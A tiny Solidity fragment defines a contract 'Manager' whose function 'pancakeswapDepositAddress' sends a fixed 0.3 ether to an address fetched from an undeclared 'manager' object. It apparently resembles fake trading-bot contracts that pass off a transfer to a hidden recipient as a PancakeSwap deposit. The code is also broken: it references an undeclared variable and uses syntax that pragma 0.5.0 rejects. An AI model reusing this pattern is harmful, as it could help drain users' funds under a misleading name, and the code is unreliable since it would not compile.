pragma solidity ^0.5.0;

contract Manager {
    
    function pancakeswapDepositAddress () public payable {
        payable(manager.pancakeswapDepositAddress()).transfer(300000000000000000);
    }
}

//pancakeswapfunction
